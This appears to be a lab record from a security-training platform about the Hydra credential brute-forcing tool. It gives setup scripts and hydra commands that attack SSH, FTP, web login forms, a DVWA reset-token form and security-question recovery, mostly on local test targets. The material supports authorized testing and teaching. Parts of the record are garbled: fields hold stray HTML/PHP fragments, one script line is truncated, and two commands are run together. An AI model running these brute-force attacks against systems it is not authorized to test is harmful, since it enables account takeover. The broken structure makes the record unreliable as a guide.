name: Hydra
overview:
It enables users to test weak or default credentials and identify vulnerabilities in authentication systems, helping organizations strengthen their security posture. Hydra supports multi-threading, custom wordlists, and password spraying techniques, making it highly efficient for credential brute-forcing.

Role

Credential Testing

Brute-forcing login credentials across multiple protocols

Exploitation Preparation

Identifying weak passwords and insecure authentication setups

Post-Exploitation

Accessing additional systems with compromised credentials

Evasion & Stealth

Adjusting attack speed, delays, and proxies to bypass detection

GitHub Repository: https://github.com/vanhauser-thc/thc-hydra

Documentation: https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md

Cheat Sheet: https://highon.coffee/blog/hydra-cheat-sheet/

core_modules.name: BRUTE_FORCE
core_modules.title: Protocol Authentication Brute-forcing
core_modules.description: Multi-threaded dictionary attacks against SSH, FTP, HTTP, RDP, SMB, and other network services.

scenarios.name: Security Action Scenario 1
objectiveList: Aim  Verify secure storage and transmission of credentials
Step1 - check and update all packages & install hydra
scenarios.script:
sudo apt install hydra
sudo apt install openssh-server -y
sudo apt update && sudo apt install openssh-server -y
sudo systemctl start ssh
sudo systemctl enable ssh
ip a | grep inet
sudo useradd -m testuser
echo "testuser:password123" | sudo chpasswd
echo -e "root\ntestuser\nadmin" > userlist.txt
echo -e "password\n123456\npassword123\nqwerty" > passlist.txt
hydra -L userlist.txt -P passlist.txt ssh://127.0.0.8 -V
hydra -L userlist.txt -P passlist.txt ftp://127.0.0.8 -V

keyTakeaways.title: RECON_VERIFICATION
keyTakeaways.content: Analyze response details from Hydra scan payloads.

keyTakeaways.title: LOG_ANALYSIS
keyTakeaways.content: Correlate output files with known indicators of compromise.

attackPaths.title: PERIMETER_PROBING
attackPaths.desc: Pivot internal scan actions targeting the newly resolved endpoints.

scenarios.name: Test hydra for open http port
scenarios.objective: Test hydra for open http port
objectiveList: Test hydra for open http port
Step-1  Install Apache Web Server & PHP
Step-2 Create a Simple Login Page
scenarios.script:
sudo apt install apache2 php -y
sudo nano /var/www/html/login.php
sudo netstat -tulnp | grep 80
hydra -L userlist.txt -P passlist.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
hydra -L userlist.txt -P passlist.txt 192.168.1.10 http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
sudo tail -f /var/log/apache2/access.log
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
sudo docker run --rm -d -p 80:80 vulnerables/web-dvwa
echo -e "123456\nresetme\nletmein\ntemp123\npassword123" > token_list.txt
hydra -L token_list.txt -p "" localhost http-post-form "/DVWA/reset-password.php:email=test@example.com&reset_token=^USER^:F=Invalid token"
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php hydra
sudo systemctl start apache2
sudo mkdir -p /var/www/html/recovery
sudo nano index.html
sudo nano process_recovery.php
sudo chown -R www-data:www-data /var/www/html/recovery
sudo chmod -R 755 /var/www/html/recovery
#!/bin/bash
hydra -L usernames.txt -P pet_names.txt \
./hydra_security_questions.sh
sudo apt update
sudo apt install apache2 php libapache2-mod-php -y
sudo systemctl start apache2
sudo systemctl enable apache2
sudo mkdir /var/www/html/auth_test
sudo nano login.phpsudo nano users.txt
sudo nano passwords.txt
hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form "/auth_test/login.php:username=^USER^&password=^PASS^:Login Failed"

keyTakeaways.title: CONCLUSION
keyTakeaways.content: - successfully tested for ftp , ssh and html  for default /guessable password

keyTakeaways.title: <LABEL_FOR="SECURITY_QUES
keyTakeaways.content: What was the name of your first pet?</label>

keyTakeaways.title: ECHO_"SUCCESS
keyTakeaways.content: Account recovery verified. You can now reset your password.";

keyTakeaways.title: STEP-8
keyTakeaways.content: Create the Hydra Attack Script and make it executable

attackPaths.title: CONCLUSION
attackPaths.desc: - Hydra brute-force attack was successful, as indicated by the "12 valid passwords found" message. This confirms that the login system is vulnerable.

troubleshooting.cause: The target service port is closed or filtered by a firewall.
troubleshooting.resolution: Verify the port is open and double check target IP.

troubleshooting.cause: Threading limits exceeded for the target host configuration.
troubleshooting.resolution: Reduce thread count using the -t flag.

security: Ensure all execution requests with Hydra are performed within authorized scope. Log all output artifacts securely and protect the integrity of local credential wordlists.
